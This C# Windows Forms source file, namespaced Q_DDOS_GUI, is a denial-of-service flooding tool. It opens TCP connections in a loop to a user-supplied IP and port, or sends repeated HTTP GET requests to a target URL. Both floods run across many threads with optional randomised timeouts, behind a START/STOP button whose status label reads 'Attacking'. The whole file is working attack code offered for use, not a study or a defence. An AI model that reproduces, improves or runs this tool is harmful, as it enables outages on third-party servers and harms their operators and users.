using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.Http;
using System.Net.Sockets;
using System.Web;
using System.Threading;
using System.Net.WebSockets;
using System.Net;

namespace Q_DDOS_GUI
{
    public partial class Form1 : Form
    {
        //MADE BY ATERRAGON
        //HECHO POR ATERRAGON
        //MADE BY  secleGhost
        //HECHO POR  secleGhost
        public string ip;
        public bool detener = false;
        public string port;
        public string timeout;
        public string threads;
        public bool iniciado = false;


        public Form1()
        {
            InitializeComponent();
        }

        public void Hilo()
        {
            Random random = new Random();
            int Port = Convert.ToInt32(port);
            int Timeout = 0;
            if (checkBox1.CheckState == CheckState.Unchecked)
            {
                Timeout = Convert.ToInt32(timeout);
            }
            for (int i = 0; i < 10000000; i++)
            {
                if (iniciado == false)
                {
                    break;
                }
                if (checkBox3.CheckState == CheckState.Checked)
                {
                    break;
                }
                if (checkBox1.CheckState == CheckState.Checked)
                {
                    Timeout = random.Next(1, 10);
                }
                TcpClient tcp = new TcpClient();
                try
                {
                    tcp.ConnectAsync(ip, Port).Wait(Timeout * 1000);
                    tcp.Close();
                }
                catch (Exception)
                {
                    tcp.Close();
                }
                tcp.Close();
            }
        }

        public void Hilo1(object state)
        {
            string ipfinal = ip;
            int Temp = 0;
            if (checkBox1.CheckState == CheckState.Unchecked)
            {
                Temp = Convert.ToInt32(timeout);
            }
            int Timeout = Temp * 1000;
            int temp;
            Random aleatorio = new Random();



            for (int i = 0; i < 10000000; i++)
            {
                GC.Collect();
                if (checkBox1.CheckState == CheckState.Checked)
                {
                    temp = aleatorio.Next(1, 3);
                    Timeout = temp * 1000;
                }
                if (checkBox4.CheckState == CheckState.Checked)
                {
                    break;
                }
                try
                {
                    HttpClient httpClient = new HttpClient();
                    try
                    {
                        httpClient.GetStringAsync(ipfinal).Wait(Timeout);
                        httpClient.CancelPendingRequests();
                        httpClient.Dispose();
                    }
                    catch
                    {
                        httpClient.CancelPendingRequests();
                        httpClient.Dispose();
                    }

                    if (iniciado == false)
                    {
                        httpClient.CancelPendingRequests();
                        httpClient.Dispose();
                        break;
                    }
                }
                catch
                {

                }



            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {
        }

        private void button1_Click(object sender, EventArgs e)
        {
            checkBox4.Checked = false;
            GC.Collect();
            label7.Text = "Attacking";
            label7.ForeColor = Color.LimeGreen;
            Thread hilo;
            Thread hilo1;

            if (checkBox4.CheckState == CheckState.Unchecked && checkBox3.CheckState == CheckState.Checked)
            {
                int b = 0;
                if (iniciado == false)
                {

                    GC.Collect();
                    button1.Text = "STOP";
                    iniciado = true;
                    int a = Convert.ToInt32(threads);
                    for (int i = 0; i < a; i++)
                    {
                        ThreadPool.QueueUserWorkItem(Hilo1);
                        /*hilo = new Thread(Hilo);
                        hilo.Start();
                        */
                        if (i > a)
                        {
                            do
                            {
                                if (detener == true)
                                {
                                   // hilo.Abort();
                                }

                                Thread.Sleep(1000);
                            } while (b == 0);
                        }
                    }
                }
                else if (iniciado == true)
                {
                    button1.Text = "START";
                    iniciado = false;
                }


            }
            else if (checkBox4.CheckState == CheckState.Unchecked && checkBox2.CheckState == CheckState.Checked)
            {
                int b = 0;
                GC.Collect();
                if (iniciado == true)
                {
                    button1.Text = "START";
                    iniciado = false;
                    b = 1;

                }
                else if (iniciado == false)
                {

                    GC.Collect();
                    button1.Text = "STOP";
                    iniciado = true;
                    int a = Convert.ToInt32(threads);
                    for (int i = 0; i < a; i++)
                    {
                        hilo1 = new Thread(Hilo1);
                        hilo1.Start();
                        if (i > a)
                        {
                            do
                            {
                                if (detener == true)
                                {
                                    hilo1.Abort();
                                }

                                Thread.Sleep(1000);
                            } while (b == 0);
                        }
                    }
                }


            }
        }

        private void textBox1_TextChanged(object sender, EventArgs e)
        {
            ip = Convert.ToString(textBox1.Text);
        }

        private void textBox2_TextChanged(object sender, EventArgs e)
        {
            port = Convert.ToString(textBox2.Text);
        }

        private void textBox4_TextChanged(object sender, EventArgs e)
        {
            threads = Convert.ToString(textBox4.Text);
        }

        private void textBox3_TextChanged(object sender, EventArgs e)
        {
            timeout = Convert.ToString(textBox3.Text);
        }

        private void checkBox4_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox4.CheckState == CheckState.Checked)
            {
                detener = true;
            }
            else if (checkBox4.CheckState == CheckState.Unchecked)
            {
                GC.Collect();
                detener = false;
            }

        }

        public void checkBox2_CheckedChanged(object sender, EventArgs e)
        {
        }

        public void checkBox3_CheckedChanged(object sender, EventArgs e)
        {
        }

        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {
            if (checkBox1.CheckState == CheckState.Unchecked)
            {
                textBox3.Enabled = true;
            }
            else if (checkBox1.CheckState == CheckState.Checked)
            {
                textBox3.Enabled = false;
            }

        }
    }
}